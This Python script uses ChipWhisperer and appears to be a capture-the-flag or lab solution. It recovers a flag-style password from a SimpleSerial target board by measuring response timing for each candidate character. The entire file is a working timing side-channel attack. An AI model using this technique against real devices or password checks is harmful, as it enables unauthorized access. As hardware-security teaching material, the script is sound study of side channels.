import time
import struct
from string import ascii_lowercase, digits

import chipwhisperer as cw


CHARSET = ascii_lowercase + digits
PASSWORD_LENGTH = 8

scope = cw.scope()
target = cw.target(scope, cw.targets.SimpleSerial)
scope.default_setup()


def reset_target(): 
    scope.io.nrst = 'low'
    time.sleep(0.05)
    scope.io.nrst = 'high_z'
    time.sleep(0.05)


def verify(password):
    start = time.perf_counter()

    timeout = target.simpleserial_write('a', password)
    if timeout:
        raise RuntimeError("Capture timed out.")

    response = target.simpleserial_read('r', 1)
    end = time.perf_counter()
    timing = end - start
    return struct.unpack("<B", response)[0], timing


def num_q():
    target.simpleserial_write('q', b"0")
    response = target.simpleserial_read('r', 4)
    return struct.unpack("<I", response)[0]


def main():
    reset_target()

    prefix = b"gk1{"
    middle = b""
    suffix = b"}"

    # Sample timing 
    reference_password = prefix + PASSWORD_LENGTH * b"!" + suffix 
    _, timing_sample = verify(reference_password)

    # Find password
    for i in range(PASSWORD_LENGTH):
        padding = (PASSWORD_LENGTH - 1 - len(middle)) * b"!"
        for character in CHARSET:
            character = character.encode()
            password = prefix + middle + character + padding + suffix
            response, timing = verify(password)

            print(f'Testing: {password.decode()}, Timing: {timing:.3f}')

            if (timing - timing_sample) > 0.002:
                middle += character
                timing_sample = timing
                break
  
    print(f"\nGot response {response} for password: {password.decode()}")

    response = num_q()
    print(f"Number of queries: {response}")


if __name__ == "__main__":
    main()
